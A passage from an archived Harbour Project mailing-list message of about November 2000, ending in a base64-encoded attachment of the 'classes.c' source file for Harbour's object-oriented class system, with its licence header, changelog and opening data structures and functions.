</I>&gt;<i> Best regards,
</I>&gt;<i> 
</I>&gt;<i> J. Lefebvre,
</I>&gt;<i> Bruxelles,
</I>&gt;<i> Belgium
</I>&gt;<i> 
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> 
</I>&gt;<i> 
</I>


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


--Message-Boundary-1364
Content-type: text/plain; charset=US-ASCII
Content-disposition: inline
Content-description: Attachment information.

The following section of this message contains a file attachment
prepared for transmission using the Internet MIME message format.
If you are using Pegasus Mail, or any another MIME-compliant system,
you should be able to save it or view it from within your mailer.
If you cannot, please ask your system administrator for assistance.

   ---- File information -----------
     File:  classes.c
     Date:  4 Nov 2000, 22:33
     Size:  68410 bytes.
     Type:  Program-source

--Message-Boundary-1364
Content-type: Application/Octet-stream; name=&quot;classes.c&quot;; type=Program-source
Content-disposition: attachment; filename=&quot;classes.c&quot;
Content-transfer-encoding: BASE64

LyoNCiAqICRJZDogY2xhc3Nlcy5jLHYgMS4zOCAyMDAwLzEwLzMxIDE5OjUyOjE2IG1hZmFj
dCBFeHAgJA0KICovDQoNCi8qDQogKiBIYXJib3VyIFByb2plY3Qgc291cmNlIGNvZGU6DQog
KiBCYXNlLXJvdXRpbmVzIGZvciBPT1BTIHN5c3RlbQ0KICoNCiAqIENvcHlyaWdodCAxOTk5
IEFudG9uaW8gTGluYXJlcyA8YWxpbmFyZXNAZml2ZXRlY2guY29tPg0KICogd3d3IC0gaHR0
cDovL3d3dy5oYXJib3VyLXByb2plY3Qub3JnDQogKg0KICogVGhpcyBwcm9ncmFtIGlzIGZy
ZWUgc29mdHdhcmU7IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkNCiAq
IGl0IHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2Ug
YXMgcHVibGlzaGVkIGJ5DQogKiB0aGUgRnJlZSBTb2Z0d2FyZSBGb3VuZGF0aW9uOyBlaXRo
ZXIgdmVyc2lvbiAyIG9mIHRoZSBMaWNlbnNlLCBvcg0KICogKGF0IHlvdXIgb3B0aW9uKSBh
bnkgbGF0ZXIgdmVyc2lvbiwgd2l0aCBvbmUgZXhjZXB0aW9uOg0KICoNCiAqIFRoZSBleGNl
cHRpb24gaXMgdGhhdCBpZiB5b3UgbGluayB0aGUgSGFyYm91ciBSdW50aW1lIExpYnJhcnkg
KEhSTCkNCiAqIGFuZC9vciB0aGUgSGFyYm91ciBWaXJ0dWFsIE1hY2hpbmUgKEhWTSkgd2l0
aCBvdGhlciBmaWxlcyB0byBwcm9kdWNlDQogKiBhbiBleGVjdXRhYmxlLCB0aGlzIGRvZXMg
bm90IGJ5IGl0c2VsZiBjYXVzZSB0aGUgcmVzdWx0aW5nIGV4ZWN1dGFibGUNCiAqIHRvIGJl
IGNvdmVyZWQgYnkgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlLiBZb3VyIHVzZSBv
ZiB0aGF0DQogKiBleGVjdXRhYmxlIGlzIGluIG5vIHdheSByZXN0cmljdGVkIG9uIGFjY291
bnQgb2YgbGlua2luZyB0aGUgSFJMDQogKiBhbmQvb3IgSFZNIGNvZGUgaW50byBpdC4NCiAq
DQogKiBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3
aWxsIGJlIHVzZWZ1bCwNCiAqIGJ1dCBXSVRIT1VUIEFOWSBXQVJSQU5UWTsgd2l0aG91dCBl
dmVuIHRoZSBpbXBsaWVkIHdhcnJhbnR5IG9mDQogKiBNRVJDSEFOVEFCSUxJVFkgb3IgRklU
TkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlDQogKiBHTlUgR2VuZXJh
bCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLg0KICoNCiAqIFlvdSBzaG91bGQg
aGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNl
DQogKiBhbG9uZyB3aXRoIHRoaXMgcHJvZ3JhbTsgaWYgbm90LCB3cml0ZSB0byB0aGUgRnJl
ZSBTb2Z0d2FyZQ0KICogRm91bmRhdGlvbiwgSW5jLiwgNjc1IE1hc3MgQXZlLCBDYW1icmlk
Z2UsIE1BIDAyMTM5LCBVU0EgKG9yIHZpc2l0DQogKiB0aGVpciB3ZWIgc2l0ZSBhdCBodHRw
Oi8vd3d3LmdudS5vcmcvKS4NCiAqDQogKi8NCg0KLyoNCiAqIFRoZSBmb2xsb3dpbmcgcGFy
dHMgYXJlIENvcHlyaWdodCBvZiB0aGUgaW5kaXZpZHVhbCBhdXRob3JzLg0KICogd3d3IC0g
aHR0cDovL3d3dy5oYXJib3VyLXByb2plY3Qub3JnDQogKg0KICogQ29weXJpZ2h0IDE5OTkg
RWRkaWUgUnVuaWEgPGVkZGllQHJ1bmlhLmNvbT4NCiAqICAgIDpDTEFTU1NFTCgpDQogKiAg
ICBfX2Nsc0RlbE1zZygpDQogKiAgICBfX2Nsc01vZE1zZygpDQogKiAgICBfX2Nsc0luc3RT
dXBlcigpDQogKiAgICBfX2Nsc19DbnRDbHNEYXRhKCkNCiAqICAgIF9fY2xzX0NudERhdGEo
KQ0KICogICAgX19jbHNfRGVjRGF0YSgpDQogKiAgICBfX2Nsc19JbmNEYXRhKCkNCiAqICAg
IF9fb2JqQ2xvbmUoKQ0KICogICAgX19vYmpIYXNNc2coKQ0KICogICAgX19vYmpTZW5kTXNn
KCkNCiAqDQogKiBDb3B5cmlnaHQgMTk5OSBWaWN0b3IgU3pha2F0cyA8aW5mb0BzemVsdmVz
ei5odT4NCiAqICAgIGhiX19fbXNnRXZhbCgpDQogKiAgICBfX0NMQVNTTkVXKCkNCiAqICAg
IF9fQ0xBU1NJTlNUQU5DRSgpDQogKiAgICBfX0NMQVNTQUREKCkNCiAqICAgIF9fQ0xBU1NO
QU1FKCkNCiAqICAgIF9fQ0xBU1NTRUwoKSAoYmFzZWQgb24gaGJfX19tc2dDbHNTZWwoKSkN
CiAqDQogKiBDb3B5cmlnaHQgMTk5OSBKYW5pY2EgTHVib3MgPGphbmljYUBmb3JuYXguZWxm
LnN0dWJhLnNrPg0KICogICAgaGJfY2xzRGljdFJlYWxsb2MoKQ0KICoNCiAqIENvcHlyaWdo
dCAyMDAwICBKRi4gTGVmZWJ2cmUgPGpmbEBtYWZhY3QuY29tPiAmIFJBLiBDdXlsZW4gPHJh
Y0BtYWZhY3QuY29tPg0KICogICAgaGJfY2xzRGljdFJlYWxsb2MoKSAgIE5ldyB2ZXJzaW9u
DQogKg0KICogQ29weXJpZ2h0IDIwMDAgSkYuIExlZmVidnJlIDxqZmxAbWFmYWN0LmNvbT4g
JiBSQS4gQ3V5bGVuIDxyYWNAbWFmYWN0LmNvbT4NCiAqICAgIE5vdyBzdXBwb3J0IG9mIHNo
YXJlZCBhbmQgbm90IHNoYXJlZCBjbGFzcyBkYXRhDQogKiAgICBNdWx0aXBsZSBpbmhlcml0
ZW5jZSBmdWxseSBpbXBsZW1lbnRlZA0KICogICAgTXVsdGlwbGUgZGF0YXMgZGVjbGFyYXRp
b24gZnVsbHkgc3VwcG9ydGVkDQogKiAgICBTdXBlciBtc2cgY29ycmVjdGx5IHJlc3BvbmQg
YnkgYSBzdXBlciBvYmplY3QNCiAqICAgIFNjb3BpbmcgOiB3b3JraW5nIGZvciBwcm90ZWN0
ZWQsIGhpZGRlbiBhbmQgcmVhZG9ubHkNCiAqICAgIERlZmluZSBvZiBIQl9NQVNLSElEREVO
IGFsbG93IHN1YmNsYXNzIHRvIG5vdCBpbmhlcml0IG9mIGhpZGRlbiBtZXNzYWdlDQogKiAg
ICBUaGlzIGltcGxpZSBhIG1lc3NhZ2Ugbm90IGZvdW5kIGVycm9yIGluIHBsYWNlIG9mIHBy
b3RlY3Rpb24gZXJyb3IgaGlkZGVuDQogKg0KICogICAgMDYvMDcvMjAwMA0KICogICAgTm93
LCBFYWNoIG9iamVjdCBpbnN0YW5jZSB3aWxsIGhvbGQgb25lIG9iamVjdCBpbnN0YW5jZSBv
ZiBhbGwgaXRzIHBhcmVudHMNCiAqICAgIFRoZSBmaXJzdCBvbmUgaGFzIHRoZSBzYW1lIHBv
aW50ZXIgYXMgU1VQRVIgYW5kIF9fU1VQRVIgbXNncy4NCiAqICAgIFNlZSBoYl9fX21zZ1N1
cGVyKCkNCiAqICAgIEVhY2ggaW5oZXJpdGVkIGRhdGEgd2lsbCBub3cgaGFzIGEgcG9pbnRl
ciBsaW5rZWQgdG8gaXQncyBvcmlnaW5hbCBvYmplY3QncyBwb3NpdGlvbg0KICoNCiAqICAg
IGhiX19fbXNnR2V0U2hyRGF0YSgpDQogKiAgICBoYl9fX21zZ1NldFNockRhdGEoKQ0KICog
ICAgaGJfX19tc2dDbHNQYXJlbnQoKQ0KICogICAgX19DTFNfUEFSQU0oKSAoTm93LCBhbGwg
Y2xhc3MgaW5oZXJpdCBhdXRvbWF0aWNseSBmcm9tIFRPYmplY3QgQ2xhc3MpDQogKiAgICBf
X0NMU1BBUkVOVCgpDQogKiAgICBfX1NFTkRFUigpDQogKiAgICBfX0NMU0lOU1QoKSAoQ2Fs
bCB0byBoYl9jbHNJbnN0KCkpDQogKiAgICBoYl9jbHNfTXNnVG9OdW0oKSAoTmV3IEhhc2hp
bmcgbWV0aG9kIHRvIGFsbG93IGEgYmV0dGVyIHVzZSBvZiBidWNrZXRzKQ0KICogICAgaGJf
Y2xzSXNQYXJlbnQoKQ0KICogICAgaGJfY2xzU2NvcGUoKQ0KICogICAgaGJfY2xzSW5zdCgp
IChNb3N0bHkgbmV3IG9uZSwgY2FsbGVkIHJlY3Vyc2l2ZWx5KQ0KICogICAgaGJfX19tc2dT
dXBlcigpIChOZXcgb25lKQ0KICogICAgaGJfX19tc2dTZXREYXRhKCkgKEVuaGFuY2VkIHJl
Z2FyZGluZyBoZXJpdGVkIGRhdGFzKQ0KICogICAgaGJfX19tc2dHZXREYXRhKCkgKEVuaGFu
Y2VkIHJlZ2FyZGluZyBoZXJpdGVkIGRhdGFzKQ0KICoNCiAqICAgIC4uLmFuZCBtYW55IG1p
bm9ycyAoYW5kIG5vdCBzbyBtaW5vcnMgOy0pIG1vZGlmaWNhdGlvbnMgKCBmb3IgVE9iamVj
dCBieSBleC4pDQogKg0KICogICAgMS4xNiAwNi8xMy8yMDAwIEpGTCZSQUMNCiAqICAgIElu
aXRpYWxpc2F0aW9uIGlzIG5vdyB3b3JraW5nIGNvcnJlY3RseQ0KICogICAgYXMgd2l0aCBh
dXRvaW5pdCBmb3IgTG9naWNhbCAoLkYuKSBhbmQgTnVtZXJpY2FsICgwKSBmcm9tIHRDbGFz
cy5wcmcNCiAqDQogKiAgICAxLjE3IDA2LzE0LzIwMDAgSkZMJlJBQw0KICogICAgdGVtcG9y
YXJ5IHdvcmtBcm91bmQgZm9yIFNlbGYgYmFkIHJlZmVyZW5jZWQgd2hlbiBjYWxsaW5nIHN1
cGVyIG9iamVjdA0KICogICAgaGJfX19tc2dTdXBlcigpIHRlbXBvcmFyeSBtb2RpZmllZA0K
ICogICAgaGJfX19tc2dDbGFzcygpIGltcGxlbWVudGVkIHRvIGFsbG93IGEgYmV0dGVyIGNv
bXBhdGliaWxpdHkgd2l0aCBjbGFzc3kNCiAqICAgIE5vdywgY2FsbGluZyBTZWxmOnhDbGFz
c0RhdGFWYXIgaXMgdGhlIHNhbWUgYXMgU2VsZjpDbGFzczp4Q2xhc3NEYXRhVmFyDQogKg0K
ICogICAgMS4xOCAwNi8/Py8yMDAwID8NCiAqICAgIDEuMTkgMDYvPz8vMjAwMCA/DQogKg0K
ICogICAgMS4yMCAwNi8yMy8yMDAwIEpGTCZSQUMNCiAqICAgIENvcnJlY3Rpb24gbWFkZSBy
ZWxhdGl2ZSB0byBDTEFTU0RBVEEgU0hBUkVEICENCiAqICAgIENvbXBsZXRseSBuZXcgbWV0
aG9kDQogKg0KICogICAgMS4yMSAwNi8yMy8yMDAwIEpGTCZSQUMNCiAqICAgIENvcnJlY3Rp
b24gbWFkZSByZWxhdGl2ZSB0byBDTEFTU0RBVEEgU0hBUkVEICENCiAqICAgIEZpeGVkIGlu
aXQgd2hlbiByZWRlZmluaW5nIG9uIHN1YmNsYXNzDQogKg0KICogICAgMS4yNiAwNy8/Py8y
MDAwIFJHbGFiDQogKiAgICBHYXJiYWdlIGNvbGxlY3RvciBmaXhlDQogKg0KICogICAgMS4y
NyAwNy8xNS8yMDAwIEpGTCZSQUMNCiAqICAgIEZpeGUgZm9yIHRoZSBwb3RlbnRpYWwgY2Fz
ZSB3aGVyZSB3ZSBjb3VkbCBub3QgZmluZA0KICogICAgb25lIGZyZWUgYnVja2V0IHdoZW4g
aW5oZXJpdGluZyB0aGUgc3VwZXIgbWV0aG9kDQogKiAgICBSZWR1Y2VkIHRoZSBudW1iZXIg
b2YgYmFzZSBtZXNzYWdlIHRvIDEwMA0KICoNCiAqICAgIDEuMjggMDcvMTgvMjAwMCBKRkwm
UkFDDQogKiAgICBTdXBwcmVzcy4gc3RhdGljIHZhciB3aXRoaW4gaGJfY2xzaW5zdCgpDQog
KiAgICBTdXBwcmVzcy4gaW5kaXJlY3QgY2FsbCB0byBpdGVtIHBvaW50ZXIgYnkgaXQncyBM
b25nIHZhbHVlDQogKiAgICBpbXByb3ZlZCBoYl9jbHNpbnN0KCkgaGJfZ2V0ZGF0YSgpIGhi
X3NldGRhdGEoKQ0KICogICAgc29sdmUgbG9zdCBpdGVtIHBvaW50ZXIgKGNhdXNpbmcgdW5y
ZWxlYXNlZCBibG9jaykgYXQgaGJfY2xzYWRkbXNnKCkNCiAqICAgIGFkZGluZyBvbmUgZnVu
Y3Rpb24gY2FsbGVkIGJ5IHRPYmplY3QucHJnIHRvIGltcGxlbWVudCA6RXJyb3IoKSBtZXNz
YWdlDQogKiAgICBzbyBpbXByb3ZpbmcgY2xhc3MoeSkgY29tcGF0aWJpbGl0eSAoSEJfRlVO
QyggVE9CSkVDVF9FUiApKQ0KICoNCiAqICAgIDEuMzQgMDcvMjUvMjAwMCBKRkwmUkFDDQog
KiAgICBfX0NMU19QQVIwMCgpIChBbGxvdyB0aGUgY3JlYXRpb24gb2YgY2xhc3Mgd2ljaCBu
b3QgYXV0b2luaGVyaXQgb2YgdGhlIGRlZmF1bHQgVE9iamVjdCkNCiAqICAgIFN1cHByZXNz
aW9uIG9mIHRoZSBkZWZhdWx0IDpDbGFzcyBtZXNzYWdlID09PiB0cmFuc2ZlcmVkIHRvIHRP
YmplY3QNCiAqDQogKiAgICAxLjM1ID8NCiAqICAgIDEuMzYgQWRkaW5nIEhCX0NMU19FTkZP
UkNFUk8gRkxBRyB0byBkaXNhYmxlIFdyaXRlIGFjY2VzcyB0byBSTyBWQVINCiAqICAgICAg
ICAgVGhpcyBpcyB3b3JrIGluIHByb2dyZXNzIChKRkwpIFNob3VsZCBiZSByZWxhdGVkIHRv
IHNvbWUgY29tcGF0aWJpbGl0eSBmbGFnDQogKiAgICAxLjM3IG1pbm9yIHN5bnRheCBjb3Jy
ZWN0aW9uDQogKiAgICAxLjM4IF9fT2JqSGFzTXNnKCkgY291bGQgcmV0dXJuIHRydWUgd2hl
biBmYWxzZQ0KICoNCiAqIFNlZSBkb2MvbGljZW5zZS50eHQgZm9yIGxpY2Vuc2luZyB0ZXJt
cy4NCiAqDQogKi8NCg0KI2luY2x1ZGUgImhiYXBpLmgiDQojaW5jbHVkZSAiaGJhcGllcnIu
aCINCiNpbmNsdWRlICJoYmFwaWl0bS5oIg0KI2luY2x1ZGUgImhidm0uaCINCiNpbmNsdWRl
ICJoYm9vLmNoIg0KDQojaW5jbHVkZSA8Y3R5cGUuaD4NCg0KLyogREVCVUcgb25seSovDQov
KiNpbmNsdWRlIDx3aW5kb3dzLmg+Ki8NCg0KdHlwZWRlZiBzdHJ1Y3QNCnsNCiAgIFBIQl9E
WU5TIHBNZXNzYWdlOyAgICAgICAgICAvKiBNZXRob2QgU3ltYm9saWMgbmFtZSAqLw0KICAg
UEhCX0ZVTkMgcEZ1bmN0aW9uOyAgICAgICAgIC8qIEZ1bmN0aW9uICdwb2ludGVyJyAqLw0K
ICAgVVNIT1JUICAgdWlEYXRhOyAgICAgICAgICAgIC8qIEl0ZW0gcG9zaXRpb24gZm9yIGRh
dGEgKEhhcmJvdXIgbGlrZSwgYmVnaW4gZnJvbSAxKSAqLw0KICAgVVNIT1JUICAgdWlEYXRh
U2hhcmVkOyAgICAgIC8qIEl0ZW0gcG9zaXRpb24gZm9yIGRhdGFzaGFyZWQgKG9yaWdpbmFs
IHBvcyB3aXRoaW4gU2hhcmVkIENsYXNzKSAqLw0KICAgVVNIT1JUICAgdWlTcHJDbGFzczsg
ICAgICAgIC8qIE9yaWdpbmFsY2xhc3MnaGFuZGVsIChzdXBlciBvciBjdXJyZW50IGNsYXNz
J2hhbmRlbCBpZiBub3QgaGVyaXRlZCkuICovIC8qQWRkZWQgYnkgUkFDJkpGKi8NCiAgIFVT
SE9SVCAgIHVpU2NvcGU7ICAgICAgICAgICAvKiBTY29waW5nIHZhbHVlICovDQogICBQSEJf
SVRFTSBwSW5pdFZhbHVlOyAgICAgICAgLyogSW5pdCBWYWx1ZSBmb3IgZGF0YSAqLw0KICAg
QllURSAgICAgYkNsc0RhdGFJbml0aWF0ZWQ7IC8qIFRoZXJlIGlzIG9uZSB2YWx1ZSBhc3Np
Z25lZCBhdCBpbml0IHRpbWUgKi8NCn0gTUVUSE9ELCAqIFBNRVRIT0Q7DQoNCnR5cGVkZWYg
c3RydWN0DQp7DQogICBjaGFyICogICBzek5hbWU7ICAgICAgICAgLyogQ2xhc3MgbmFtZSAq
Lw0KICAgVVNIT1JUICAgdWlEYXRhczsgICAgICAgIC8qIFRvdGFsIERhdGEgQ291bnRlciAq
Lw0KICAgVVNIT1JUICAgdWlEYXRhRmlyc3Q7ICAgIC8qIEZpcnN0IHVpRGF0YSBmcm9tIHRo
aXMgY2xhc3MgKi8NCiAgIFBNRVRIT0QgIHBNZXRob2RzOw0KICAgVVNIT1JUICAgdWlNZXRo
b2RzOyAgICAgIC8qIFRvdGFsIE1ldGhvZCBpbml0aWFsaXNlZCBDb3VudGVyICovDQogICBV
U0hPUlQgICB1aUhhc2hLZXk7DQogICBVU0hPUlQgICB1aURhdGFzU2hhcmVkOyAgLyogVG90
YWwgc2hhcmVkIENsYXNzIGRhdGEgd2l0aGluIENsYXNzIGRhdGEgKi8NCiAgIFBIQl9JVEVN
IHBDbGFzc0RhdGFzOyAgICAvKiBIYXJib3VyIEFycmF5IGZvciBDbGFzc0RhdGFzIGFuZCBz
aGFyZWQgKi8NCiAgIFBIQl9JVEVNIHBJbmxpbmVzOyAgICAgICAvKiBBcnJheSBmb3IgaW5s
aW5lIGNvZGVibG9ja3MgKi8NCiAgIFBIQl9GVU5DIHBGdW5FcnJvcjsgICAgICAvKiBlcnJv
ciBoYW5kbGVyIGZvciBub3QgZGVmaW5lZCBtZXNzYWdlcyAqLw0KfSBDTEFTUywgKiBQQ0xB
U1M7DQoNCiNkZWZpbmUgQkFTRV9NRVRIT0RTICAgMTAwICAvKiBzdGFydGluZyBtYXhpbXVt
IG51bWJlciBvZiBtZXNzYWdlICovDQojZGVmaW5lIEJVQ0tFVCAgICAgICAgICA1DQojZGVm
aW5lIEhBU0hfS0VZICAgICAgICAoIEJBU0VfTUVUSE9EUyAvIEJVQ0tFVCApIC8qIElkZWFs
eSwgaGVyZSB3ZSB3YW50IGEgIm5vbWJyZSBwcmVtaWVyIiAqLw0KDQpzdGF0aWMgUENMQVNT
ICAgc19wQ2xhc3NlcyAgICAgPSBOVUxMOw0Kc3RhdGljIFVTSE9SVCAgIHNfdWlDbGFzc2Vz
ICAgID0gMDsNCnN0YXRpYyBQTUVUSE9EICBzX3BNZXRob2QgICAgICA9IE5VTEw7IC8qIFRP
RklYOiBUaGUgb2JqZWN0IGVuZ2luZSBpcyBub3QgdGhyZWFkIHNhZmUgYmVjYXVzZSBvZiB0
aGlzLiBbdnN6YWthdHNdICovDQpzdGF0aWMgUEhCX0RZTlMgc19tc2dDbGFzc05hbWUgPSBO
VUxMOw0Kc3RhdGljIFBIQl9EWU5TIHNfbXNnQ2xhc3NIICAgID0gTlVMTDsNCnN0YXRpYyBQ
SEJfRFlOUyBzX21zZ0V2YWwgICAgICA9IE5VTEw7DQpzdGF0aWMgUEhCX0RZTlMgc19tc2dD
bGFzc1NlbCAgPSBOVUxMOw0Kc3RhdGljIFBIQl9EWU5TIHNfbXNnQ2xzUGFyZW50ID0gTlVM
TDsNCi8qIHN0YXRpYyBQSEJfRFlOUyBzX21zZ0NsYXNzICAgICA9IE5VTEw7ICovDQoNCi8q
IEFsbCBmdW5jdGlvbnMgY29udGFpbmVkIGluIGNsYXNzZXMuYyAqLw0KDQpzdGF0aWMgUEhC
X0lURU0gaGJfY2xzSW5zdCggVVNIT1JUIHVpQ2xhc3MsIFBIQl9JVEVNICogKiBwcE9iamVj
dHMsIFVTSE9SVCAqIHB1aVNpemUgKTsNCnN0YXRpYyB2b2lkICAgICBoYl9jbHNTY29wZSgg
UEhCX0lURU0gcE9iamVjdCwgUE1FVEhPRCBwTWV0aG9kICk7DQpzdGF0aWMgVUxPTkcgICAg
aGJfY2xzX01zZ1RvTnVtKCBQSEJfRFlOUyBwTXNnICk7DQpzdGF0aWMgQk9PTCAgICAgaGJf
Y2xzSXNQYXJlbnQoIFBDTEFTUyBwQ2xhc3MsIGNoYXIgKiBzelBhcmVudE5hbWUgKTsNCnN0
YXRpYyB2b2lkICAgICBoYl9jbHNEaWN0UmVhbGxvYyggUENMQVNTIHBDbGFzcyApOw0Kc3Rh
dGljIHZvaWQgICAgIGhiX2Nsc1JlbGVhc2UoIFBDTEFTUyApOw0KICAgICAgIHZvaWQgICAg
IGhiX2Nsc1JlbGVhc2VBbGwoIHZvaWQgKTsNCg0KICAgICAgIGNoYXIgKiAgIGhiX29iakdl
dENsc05hbWUoIFBIQl9JVEVNIHBPYmplY3QgKTsNCiAgICAgICBQSEJfRlVOQyBoYl9vYmpH
ZXRNZXRob2QoIFBIQl9JVEVNLCBQSEJfU1lNQiApOw0KICAgICAgIFBIQl9GVU5DIGhiX29i
akdldE10aGQoIFBIQl9JVEVNIHBPYmplY3QsIFBIQl9TWU1CIHBNZXNzYWdlLCBCT09MIGxB
bGxvd0VyckZ1bmMgKTsNCiAgICAgICBVTE9ORyAgICBoYl9vYmpIYXNNc2coIFBIQl9JVEVN
IHBPYmplY3QsIGNoYXIgKiBzelN0cmluZyApOw0KDQpzdGF0aWMgSEFSQk9VUiAgaGJfX19t
c2dDbHNIKCB2b2lkICk7DQpzdGF0aWMgSEFSQk9VUiAgaGJfX19tc2dDbHNOYW1lKCB2b2lk
ICk7DQpzdGF0aWMgSEFSQk9VUiAgaGJfX19tc2dDbHNTZWwoIHZvaWQgKTsNCi8qIHN0YXRp
YyBIQVJCT1VSICBoYl9fX21zZ0NsYXNzKCB2b2lkICk7ICovDQpzdGF0aWMgSEFSQk9VUiAg
aGJfX19tc2dTdXBlciggdm9pZCApOw0Kc3RhdGljIEhBUkJPVVIgIGhiX19fbXNnRXZhbElu
bGluZSggdm9pZCApOw0Kc3RhdGljIEhBUkJPVVIgIGhiX19fbXNnQ2xzUGFyZW50KCB2b2lk
ICk7DQpzdGF0aWMgSEFSQk9VUiAgaGJfX19tc2dFdmFsKCB2b2lkICk7DQpzdGF0aWMgSEFS
Qk9VUiAgaGJfX19tc2dWaXJ0dWFsKCB2b2lkICk7DQpzdGF0aWMgSEFSQk9VUiAgaGJfX19t
c2dHZXRDbHNEYXRhKCB2b2lkICk7DQpzdGF0aWMgSEFSQk9VUiAgaGJfX19tc2dTZXRDbHNE
YXRhKCB2b2lkICk7DQpzdGF0aWMgSEFSQk9VUiAgaGJfX19tc2dHZXRTaHJEYXRhKCB2b2lk
ICk7DQpzdGF0aWMgSEFSQk9VUiAgaGJfX19tc2dTZXRTaHJEYXRhKCB2b2lkICk7DQpzdGF0
aWMgSEFSQk9VUiAgaGJfX19tc2dHZXREYXRhKCB2b2lkICk7DQpzdGF0aWMgSEFSQk9VUiAg
aGJfX19tc2dTZXREYXRhKCB2b2lkICk7DQoNCi8qID09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PSAqLw0KDQovKg0KICogaGJfY2xzRGljdFJlYWxs
b2MoIFBDTEFTUyApDQogKg0KICogUmVhbGxvYyAod2lkZW4pIGNsYXNzDQogKi8NCnN0YXRp
YyB2b2lkIGhiX2Nsc0RpY3RSZWFsbG9jKCBQQ0xBU1MgcENsYXNzICkNCnsNCiAgIEhCX1RS
QUNFKEhCX1RSX0RFQlVHLCAoImhiX2Nsc0RpY3RSZWFsbG9jKCVwKSIsIHBDbGFzcykpOw0K
DQogICBpZiggcENsYXNzICkNCiAgIHsNCiAgICAgIFBNRVRIT0QgcE5ld01ldGhvZHM7DQog
ICAgICBVU0hPUlQgIHVpTmV3SGFzaEtleSA9IHBDbGFzcy0+dWlIYXNoS2V5Ow0KICAgICAg
VVNIT1JUICB1aTsNCiAgICAgIFVTSE9SVCAgdWlMaW1pdCA9ICggVVNIT1JUICkgKCBwQ2xh
c3MtPnVpSGFzaEtleSAqIEJVQ0tFVCApOw0KDQogICAgICBkbw0KICAgICAgew0KICAgICAg
ICAgdWlOZXdIYXNoS2V5ICs9ICggVVNIT1JUICkgSEFTSF9LRVkgOw0KDQogICAgICAgICBw
TmV3TWV0aG9kcyA9ICggUE1FVEhPRCApIGhiX3hncmFiKCB1aU5ld0hhc2hLZXkgKiBCVUNL
RVQgKiBzaXplb2YoIE1FVEhPRCApICk7DQogICAgICAgICBtZW1zZXQoIHBOZXdNZXRob2Rz
LCAwLCB1aU5ld0hhc2hLZXkgKiBCVUNLRVQgKiBzaXplb2YoIE1FVEhPRCApICk7DQoNCg0K
ICAgICAgICAgZm9yKCB1aSA9IDA7IHVpIDwgdWlMaW1pdDsgdWkrKyApDQogICAgICAgICB7
DQogICAgICAgICAgICAgUEhCX0RZTlMgcE1lc3NhZ2UgPSAoIFBIQl9EWU5TICkgcENsYXNz
LT5wTWV0aG9kc1sgdWkgXS5wTWVzc2FnZTsNCg0KICAgICAgICAgICAgIGlmKCBwTWVzc2Fn
ZSApDQogICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFVTSE9SVCB1aUJ1Y2tldDsN
CiAgICAgICAgICAgICAgICBVU0hPUlQgdWlBdCA9ICggVVNIT1JUICkgKCAoIGhiX2Nsc19N
c2dUb051bSggcE1lc3NhZ2UgKSAlIHVpTmV3SGFzaEtleSApICogQlVDS0VUICk7DQoNCiAg
ICAgICAgICAgICAgICBmb3IoIHVpQnVja2V0ID0gMDsgdWlCdWNrZXQgPCBCVUNLRVQ7IHVp
QnVja2V0KysgKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYo
IHBOZXdNZXRob2RzWyB1aUF0K3VpQnVja2V0IF0ucE1lc3NhZ2UgPT0gMCApIC8qIHRoaXMg
bWVzc2FnZSBwb3NpdGlvbiBpcyBlbXB0eSAqLw0KICAgICAgICAgICAgICAgICAgICB7DQog
ICAgICAgICAgICAgICAgICAgICAgIGhiX3htZW1jcHkoIHBOZXdNZXRob2RzICsgKHVpQXQr
dWlCdWNrZXQpLCBwQ2xhc3MtPnBNZXRob2RzICsgdWksIHNpemVvZiggTUVUSE9EICkgKTsN
CiAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgIH0N
CiAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAvKiBOb3QgZW5vdWdoIGdv
IGJhY2sgdG8gdGhlIGJlZ2lubmluZyAqLw0KICAgICAgICAgICAgICAgIGlmKCB1aUJ1Y2tl
dCA+PSBCVUNLRVQgKSAvKiYmIG5PY2N1cnMrKyA8IDUpKi8NCiAgICAgICAgICAgICAgICB7
DQogICAgICAgICAgICAgICAgICAgaGJfeGZyZWUoIHBOZXdNZXRob2RzICk7DQogICAgICAg
ICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAg
IC8qZWxzZQ0KICAgICAgICAgICAgICAgICAgIGlmKCBuT2NjdXJzIDwgNSApDQogICAgICAg
ICAgICAgICAgICAgICAgbk9jY3VycyA9IDA7DQogICAgICAgICAgICAgICAgICAgZWxzZQ0K
ICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICBoYl94ZnJlZSgg
cE5ld01ldGhvZHMgKTsNCiAgICAgICAgICAgICAgICAgICAgICBoYl9lcnJJbnRlcm5hbCgg
OTk5OSwgIk5vdCBhYmxlIHRvIHJlYWxsb2MgY2xhc3NtZXNzYWdlISBfX2Nsc0RpY3RSZWFs
bG9jIiwgTlVMTCwgTlVMTCApOw0KICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAg
